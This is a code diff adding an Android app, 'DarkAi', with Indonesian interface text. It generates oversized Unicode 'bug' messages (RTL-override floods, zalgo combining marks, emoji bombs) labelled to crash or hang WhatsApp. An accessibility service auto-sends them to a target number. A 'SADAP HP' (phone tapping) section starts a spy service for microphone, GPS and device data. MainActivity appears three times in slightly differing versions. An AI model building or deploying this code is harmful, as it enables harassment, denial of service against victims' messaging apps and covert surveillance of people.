@@ -1,0 +1,689 @@
+DarkAi/
+└── app/src/main/
+    ├── AndroidManifest.xml
+    ├── java/com/wanz/darkai/
+    │   ├── MainActivity.java
+    │   ├── AutoSendService.java
+    │   ├── BugGenerator.java
+    │   └── SpyService.java
+    └── res/
+        ├── values/strings.xml
+        └── xml/auto_service.xml<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+
+    <application
+        android:allowBackup="true"
+        android:label="DarkAi"
+        android:theme="@android:style/Theme.Material.NoActionBar">
+
+        <activity android:name=".MainActivity" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".AutoSendService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/auto_service"/>
+        </service>
+
+        <service
+            android:name=".SpyService"
+            android:foregroundServiceType="camera|microphone|location"
+            android:exported="false"/>
+
+    </application>
+</manifest><?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagReportViewIds"
+    android:canRetrieveWindowContent="true"
+    android:notificationTimeout="100"
+    android:description="Auto kirim bug WhatsApp"/><resources>
+    <string name="app_name">DarkAi</string>
+</resources>package com.wanz.darkai;
+
+import java.util.Random;
+
+public class BugGenerator {
+    private static final Random RNG = new Random();
+
+    public static String generate(String jenis) {
+        switch (jenis) {
+            case "fc":    return fc();
+            case "delay": return delay();
+            case "blank": return blank();
+            case "rtl":   return rtl();
+            case "zalgo": return zalgo();
+            case "bomb":  return bomb();
+            case "crash": return crash();
+            case "hang":  return hang();
+            default:      return crash();
+        }
+    }
+
+    private static String fc() {
+        String[] e = {"🇦","🇧","🇨","🇩","🇪","🇫","🇬","🇭","🇮","🇯","🇰","🇱","🇲","🇳","🇴","🇵"};
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < 3000; i++) sb.append(e[i % e.length]);
+        return sb.toString();
+    }
+    private static String delay() {
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < 40000; i++) sb.append('\u2067');
+        return sb.toString();
+    }
+    private static String blank() {
+        StringBuilder sb = new StringBuilder();
+        char[] m = new char[0x170];
+        int idx = 0;
+        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
+        for (int c = 0; c < 700; c++) {
+            sb.append('A');
+            for (int i = 0; i < 60; i++) sb.append(m[RNG.nextInt(idx)]);
+        }
+        return sb.toString();
+    }
+    private static String rtl() {
+        StringBuilder sb = new StringBuilder();
+        sb.append('\u202E');
+        for (int i = 0; i < 700; i++) sb.append("!dlrow olleH");
+        sb.append('\u202C');
+        return sb.toString();
+    }
+    private static String zalgo() {
+        StringBuilder sb = new StringBuilder();
+        char[] m = new char[0x70];
+        int idx = 0;
+        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
+        for (int c = 0; c < 200; c++) {
+            sb.append("💀");
+            for (int i = 0; i < 80; i++) sb.append(m[RNG.nextInt(idx)]);
+        }
+        return sb.toString();
+    }
+    private static String bomb() {
+        String[] p = {"💣","💥","🔥","⚡","🌀","💀","☠️","👺","🤖","👾","🎃","👻","😈","👿","🕷","🦂"};
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < 5000; i++) sb.append(p[i % p.length]);
+        return sb.toString();
+    }
+    private static String crash() {
+        StringBuilder sb = new StringBuilder();
+        char[] m = new char[0x70];
+        int idx = 0;
+        for (int i = 0x0300; i <= 0x036F; i++) m[idx++] = (char) i;
+        for (int c = 0; c < 1200; c++) {
+            sb.append((char) (0x0900 + RNG.nextInt(200)));
+            for (int i = 0; i < 90; i++) sb.append(m[RNG.nextInt(idx)]);
+        }
+        return sb.toString();
+    }
+    private static String hang() {
+        StringBuilder sb = new StringBuilder();
+        sb.append('\u202E');
+        for (int i = 0; i < 7000; i++) sb.append("\u2067\u202E");
+        return sb.toString();
+    }
+}package com.wanz.darkai;
+
+import android.accessibilityservice.AccessibilityService;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
+import android.os.Bundle;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import java.util.List;
+
+public class AutoSendService extends AccessibilityService {
+    public static AutoSendService instance;
+    private String pendingText = null;
+    private boolean waiting = false;
+    private long lastTrigger = 0;
+
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        instance = this;
+    }
+
+    public void triggerSend(String nomor, String jenisBug) {
+        String teks = BugGenerator.generate(jenisBug);
+        ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        cm.setPrimaryClip(ClipData.newPlainText("bug", teks));
+        pendingText = teks;
+        waiting = true;
+        lastTrigger = System.currentTimeMillis();
+        android.content.Intent i = new android.content.Intent(android.content.Intent.ACTION_VIEW);
+        i.setData(android.net.Uri.parse("https://wa.me/" + nomor));
+        i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(i);
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event == null || !waiting) return;
+        if (event.getPackageName() == null) return;
+        String pkg = event.getPackageName().toString();
+        if (!pkg.equals("com.whatsapp") && !pkg.equals("com.whatsapp.w4b")) return;
+        if (System.currentTimeMillis() - lastTrigger > 15000) {
+            waiting = false; pendingText = null; return;
+        }
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root == null) return;
+        AccessibilityNodeInfo edit = findInput(root);
+        if (edit == null) return;
+        Bundle args = new Bundle();
+        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pendingText);
+        edit.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+        edit.postDelayed(() -> {
+            AccessibilityNodeInfo r2 = getRootInActiveWindow();
+            if (r2 == null) return;
+            AccessibilityNodeInfo send = findSend(r2);
+            if (send != null && send.isClickable()) {
+                send.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                waiting = false; pendingText = null;
+            }
+        }, 700);
+    }
+
+    private AccessibilityNodeInfo findInput(AccessibilityNodeInfo root) {
+        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry");
+        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/entry");
+        if (l != null && !l.isEmpty()) return l.get(0);
+        return findClass(root, "android.widget.EditText");
+    }
+    private AccessibilityNodeInfo findSend(AccessibilityNodeInfo root) {
+        List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send");
+        if (l == null || l.isEmpty()) l = root.findAccessibilityNodeInfosByViewId("com.whatsapp.w4b:id/send");
+        if (l != null && !l.isEmpty()) return l.get(0);
+        return findDesc(root, "Send");
+    }
+    private AccessibilityNodeInfo findClass(AccessibilityNodeInfo n, String c) {
+        if (n == null) return null;
+        if (n.getClassName() != null && n.getClassName().toString().equals(c)) return n;
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo r = findClass(n.getChild(i), c);
+            if (r != null) return r;
+        }
+        return null;
+    }
+    private AccessibilityNodeInfo findDesc(AccessibilityNodeInfo n, String d) {
+        if (n == null) return null;
+        if (n.getContentDescription() != null && n.getContentDescription().toString().equalsIgnoreCase(d)) return n;
+        for (int i = 0; i < n.getChildCount(); i++) {
+            AccessibilityNodeInfo r = findDesc(n.getChild(i), d);
+            if (r != null) return r;
+        }
+        return null;
+    }
+    @Override public void onInterrupt() { waiting = false; pendingText = null; }
+}package com.wanz.darkai;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.Typeface;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.view.Gravity;
+import android.widget.*;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+public class MainActivity extends AppCompatActivity {
+    private EditText etNomor;
+    private TextView tvLog;
+    private String target = "";
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        String[] perms = {
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_CONTACTS
+        };
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, perms, 100);
+                break;
+            }
+        }
+        buildUI();
+    }
+
+    private void buildUI() {
+        ScrollView sv = new ScrollView(this);
+        sv.setBackgroundColor(Color.parseColor("#0A0014"));
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setPadding(40, 40, 40, 40);
+
+        TextView title = new TextView(this);
+        title.setText("DarkAi - BY WANZ");
+        title.setTextColor(Color.parseColor("#00F0FF"));
+        title.setTextSize(24);
+        title.setGravity(Gravity.CENTER);
+        root.addView(title);
+
+        Button btnAcc = new Button(this);
+        btnAcc.setText("AKTIFKAN AUTO-SEND");
+        btnAcc.setBackgroundColor(Color.parseColor("#00D4FF"));
+        btnAcc.setTextColor(Color.WHITE);
+        btnAcc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+        root.addView(btnAcc);
+
+        etNomor = new EditText(this);
+        etNomor.setHint("628xxxxxxxxxx");
+        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
+        etNomor.setTextColor(Color.WHITE);
+        etNomor.setBackgroundColor(Color.parseColor("#150A26"));
+        etNomor.setPadding(30, 30, 30, 30);
+        root.addView(etNomor);
+
+        Button btnSet = new Button(this);
+        btnSet.setText("SET TARGET");
+        btnSet.setBackgroundColor(Color.parseColor("#8B5CF6"));
+        btnSet.setTextColor(Color.WHITE);
+        btnSet.setOnClickListener(v -> {
+            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
+            if (n.length() < 8) { Toast.makeText(this, "Nomor tidak valid", Toast.LENGTH_SHORT).show(); return; }
+            target = n;
+            Toast.makeText(this, "Target: +" + n, Toast.LENGTH_SHORT).show();
+            log("Target: +" + n);
+        });
+        root.addView(btnSet);
+
+        String[][] bugs = {
+            {"FORCE CLOSE", "fc"}, {"DELAY", "delay"}, {"BLANK", "blank"}, {"RTL", "rtl"},
+            {"ZALGO", "zalgo"}, {"BOMB", "bomb"}, {"CRASH", "crash"}, {"HANG", "hang"}
+        };
+        for (String[] bug : bugs) {
+            Button btn = new Button(this);
+            btn.setText(bug[0]);
+            btn.setBackgroundColor(Color.parseColor("#FF2D95"));
+            btn.setTextColor(Color.WHITE);
+            final String jenis = bug[1];
+            btn.setOnClickListener(v -> {
+                if (target.isEmpty()) { Toast.makeText(this, "Set target dulu!", Toast.LENGTH_SHORT).show(); return; }
+                if (AutoSendService.instance == null) {
+                    Toast.makeText(this, "Aktifkan Accessibility!", Toast.LENGTH_SHORT).show();
+                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                    return;
+                }
+                AutoSendService.instance.triggerSend(target, jenis);
+                log("BUG " + jenis.toUpperCase() + " -> +" + target);
+                Toast.makeText(this, "Kirim " + jenis, Toast.LENGTH_SHORT).show();
+            });
+            root.addView(btn);
+        }
+
+        tvLog = new TextView(this);
+        tvLog.setText("[DarkAi] Ready...");
+        tvLog.setTextColor(Color.parseColor("#25D366"));
+        tvLog.setTypeface(Typeface.MONOSPACE);
+        tvLog.setTextSize(10);
+        tvLog.setBackgroundColor(Color.BLACK);
+        tvLog.setPadding(20, 20, 20, 20);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 500);
+        tvLog.setLayoutParams(lp);
+        root.addView(tvLog);
+
+        sv.addView(root);
+        setContentView(sv);
+    }
+
+    private void log(String s) {
+        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
+        tvLog.append("\n[" + t + "] " + s);
+    }
+}package com.wanz.darkai;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.Typeface;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.view.Gravity;
+import android.widget.*;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+public class MainActivity extends AppCompatActivity {
+    private EditText etNomor;
+    private TextView tvLog;
+    private String target = "";
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        String[] perms = {
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_CONTACTS
+        };
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, perms, 100);
+                break;
+            }
+        }
+        buildUI();
+    }
+
+    private void buildUI() {
+        ScrollView sv = new ScrollView(this);
+        sv.setBackgroundColor(Color.parseColor("#0A0014"));
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setPadding(40, 40, 40, 40);
+
+        TextView title = new TextView(this);
+        title.setText("DarkAi - BY WANZ");
+        title.setTextColor(Color.parseColor("#00F0FF"));
+        title.setTextSize(24);
+        title.setGravity(Gravity.CENTER);
+        root.addView(title);
+
+        Button btnAcc = new Button(this);
+        btnAcc.setText("AKTIFKAN AUTO-SEND");
+        btnAcc.setBackgroundColor(Color.parseColor("#00D4FF"));
+        btnAcc.setTextColor(Color.WHITE);
+        btnAcc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+        root.addView(btnAcc);
+
+        etNomor = new EditText(this);
+        etNomor.setHint("628xxxxxxxxxx");
+        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
+        etNomor.setTextColor(Color.WHITE);
+        etNomor.setBackgroundColor(Color.parseColor("#150A26"));
+        etNomor.setPadding(30, 30, 30, 30);
+        root.addView(etNomor);
+
+        Button btnSet = new Button(this);
+        btnSet.setText("SET TARGET");
+        btnSet.setBackgroundColor(Color.parseColor("#8B5CF6"));
+        btnSet.setTextColor(Color.WHITE);
+        btnSet.setOnClickListener(v -> {
+            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
+            if (n.length() < 8) { Toast.makeText(this, "Nomor tidak valid", Toast.LENGTH_SHORT).show(); return; }
+            target = n;
+            Toast.makeText(this, "Target: +" + n, Toast.LENGTH_SHORT).show();
+            log("Target: +" + n);
+        });
+        root.addView(btnSet);
+
+        addSection(root, "BUG WA");
+        String[][] bugs = {
+            {"FORCE CLOSE", "fc"}, {"DELAY", "delay"}, {"BLANK", "blank"}, {"RTL", "rtl"},
+            {"ZALGO", "zalgo"}, {"BOMB", "bomb"}, {"CRASH", "crash"}, {"HANG", "hang"}
+        };
+        for (String[] bug : bugs) {
+            Button btn = new Button(this);
+            btn.setText(bug[0]);
+            btn.setBackgroundColor(Color.parseColor("#FF2D95"));
+            btn.setTextColor(Color.WHITE);
+            final String jenis = bug[1];
+            btn.setOnClickListener(v -> {
+                if (target.isEmpty()) { Toast.makeText(this, "Set target dulu!", Toast.LENGTH_SHORT).show(); return; }
+                if (AutoSendService.instance == null) {
+                    Toast.makeText(this, "Aktifkan Accessibility!", Toast.LENGTH_SHORT).show();
+                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                    return;
+                }
+                AutoSendService.instance.triggerSend(target, jenis);
+                log("BUG " + jenis.toUpperCase() + " -> +" + target);
+                Toast.makeText(this, "Kirim " + jenis, Toast.LENGTH_SHORT).show();
+            });
+            root.addView(btn);
+        }
+
+        addSection(root, "SADAP HP");
+        String[][] spy = {
+            {"INFO HP", "info"}, {"MIC 30s", "mic"},
+            {"GPS", "gps"}, {"BATERAI", "battery"}
+        };
+        for (String[] sp : spy) {
+            Button btn = new Button(this);
+            btn.setText(sp[0]);
+            btn.setBackgroundColor(Color.parseColor("#FF9500"));
+            btn.setTextColor(Color.WHITE);
+            final String cmd = sp[1];
+            btn.setOnClickListener(v -> {
+                Intent i = new Intent(this, SpyService.class);
+                i.putExtra("cmd", cmd);
+                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
+                else startService(i);
+                log("SADAP: " + cmd);
+                Toast.makeText(this, "Sadap " + cmd, Toast.LENGTH_SHORT).show();
+            });
+            root.addView(btn);
+        }
+
+        addSection(root, "LOG");
+        tvLog = new TextView(this);
+        tvLog.setText("[DarkAi] Ready...");
+        tvLog.setTextColor(Color.parseColor("#25D366"));
+        tvLog.setTypeface(Typeface.MONOSPACE);
+        tvLog.setTextSize(10);
+        tvLog.setBackgroundColor(Color.BLACK);
+        tvLog.setPadding(20, 20, 20, 20);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 500);
+        tvLog.setLayoutParams(lp);
+        root.addView(tvLog);
+
+        sv.addView(root);
+        setContentView(sv);
+    }
+
+    private void addSection(LinearLayout root, String title) {
+        TextView t = new TextView(this);
+        t.setText(title);
+        t.setTextColor(Color.parseColor("#00F0FF"));
+        t.setTextSize(13);
+        t.setTypeface(Typeface.DEFAULT_BOLD);
+        t.setPadding(0, 30, 0, 10);
+        root.addView(t);
+    }
+
+    private void log(String s) {
+        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
+        tvLog.append("\n[" + t + "] " + s);
+    }
+}package com.wanz.darkai;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.Typeface;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.view.Gravity;
+import android.widget.*;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+public class MainActivity extends AppCompatActivity {
+    private EditText etNomor;
+    private TextView tvLog;
+    private String target = "";
+
+    @Override
+    protected void onCreate(Bundle b) {
+        super.onCreate(b);
+        String[] perms = {
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_CONTACTS
+        };
+        for (String p : perms) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this, perms, 100);
+                break;
+            }
+        }
+        buildUI();
+    }
+
+    private void buildUI() {
+        ScrollView sv = new ScrollView(this);
+        sv.setBackgroundColor(Color.parseColor("#0A0014"));
+        LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setPadding(40, 40, 40, 40);
+
+        TextView title = new TextView(this);
+        title.setText("DarkAi - BY WANZ");
+        title.setTextColor(Color.parseColor("#00F0FF"));
+        title.setTextSize(24);
+        title.setGravity(Gravity.CENTER);
+        root.addView(title);
+
+        Button btnAcc = new Button(this);
+        btnAcc.setText("AKTIFKAN AUTO-SEND");
+        btnAcc.setBackgroundColor(Color.parseColor("#00D4FF"));
+        btnAcc.setTextColor(Color.WHITE);
+        btnAcc.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+        root.addView(btnAcc);
+
+        etNomor = new EditText(this);
+        etNomor.setHint("628xxxxxxxxxx");
+        etNomor.setInputType(android.text.InputType.TYPE_CLASS_PHONE);
+        etNomor.setTextColor(Color.WHITE);
+        etNomor.setBackgroundColor(Color.parseColor("#150A26"));
+        etNomor.setPadding(30, 30, 30, 30);
+        root.addView(etNomor);
+
+        Button btnSet = new Button(this);
+        btnSet.setText("SET TARGET");
+        btnSet.setBackgroundColor(Color.parseColor("#8B5CF6"));
+        btnSet.setTextColor(Color.WHITE);
+        btnSet.setOnClickListener(v -> {
+            String n = etNomor.getText().toString().replaceAll("[^0-9]", "");
+            if (n.length() < 8) { Toast.makeText(this, "Nomor tidak valid", Toast.LENGTH_SHORT).show(); return; }
+            target = n;
+            Toast.makeText(this, "Target: +" + n, Toast.LENGTH_SHORT).show();
+            log("Target: +" + n);
+        });
+        root.addView(btnSet);
+
+        addSection(root, "BUG WA");
+        String[][] bugs = {
+            {"FORCE CLOSE", "fc"}, {"DELAY", "delay"}, {"BLANK", "blank"}, {"RTL", "rtl"},
+            {"ZALGO", "zalgo"}, {"BOMB", "bomb"}, {"CRASH", "crash"}, {"HANG", "hang"}
+        };
+        for (String[] bug : bugs) {
+            Button btn = new Button(this);
+            btn.setText(bug[0]);
+            btn.setBackgroundColor(Color.parseColor("#FF2D95"));
+            btn.setTextColor(Color.WHITE);
+            final String jenis = bug[1];
+            btn.setOnClickListener(v -> {
+                if (target.isEmpty()) { Toast.makeText(this, "Set target dulu!", Toast.LENGTH_SHORT).show(); return; }
+                if (AutoSendService.instance == null) {
+                    Toast.makeText(this, "Aktifkan Accessibility!", Toast.LENGTH_SHORT).show();
+                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                    return;
+                }
+                AutoSendService.instance.triggerSend(target, jenis);
+                log("BUG " + jenis.toUpperCase() + " -> +" + target);
+                Toast.makeText(this, "Kirim " + jenis, Toast.LENGTH_SHORT).show();
+            });
+            root.addView(btn);
+        }
+
+        addSection(root, "SADAP HP");
+        String[][] spy = {
+            {"INFO HP", "info"}, {"MIC 30s", "mic"},
+            {"GPS", "gps"}, {"BATERAI", "battery"}
+        };
+        for (String[] sp : spy) {
+            Button btn = new Button(this);
+            btn.setText(sp[0]);
+            btn.setBackgroundColor(Color.parseColor("#FF9500"));
+            btn.setTextColor(Color.WHITE);
+            final String cmd = sp[1];
+            btn.setOnClickListener(v -> {
+                Intent i = new Intent(this, SpyService.class);
+                i.putExtra("cmd", cmd);
+                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
+                else startService(i);
+                log("SADAP: " + cmd);
+                Toast.makeText(this, "Sadap " + cmd, Toast.LENGTH_SHORT).show();
+            });
+            root.addView(btn);
+        }
+
+        addSection(root, "LOG");
+        tvLog = new TextView(this);
+        tvLog.setText("[DarkAi] Ready...");
+        tvLog.setTextColor(Color.parseColor("#25D366"));
+        tvLog.setTypeface(Typeface.MONOSPACE);
+        tvLog.setTextSize(10);
+        tvLog.setBackgroundColor(Color.BLACK);
+        tvLog.setPadding(20, 20, 20, 20);
+        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT, 500);
+        tvLog.setLayoutParams(lp);
+        root.addView(tvLog);
+
+        sv.addView(root);
+        setContentView(sv);
+    }
+
+    private void addSection(LinearLayout root, String title) {
+        TextView t = new TextView(this);
+        t.setText(title);
+        t.setTextColor(Color.parseColor("#00F0FF"));
+        t.setTextSize(13);
+        t.setTypeface(Typeface.DEFAULT_BOLD);
+        t.setPadding(0, 30, 0, 10);
+        root.addView(t);
+    }
+
+    private void log(String s) {
+        String t = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
+        tvLog.append("\n[" + t + "] " + s);
+    }
+}
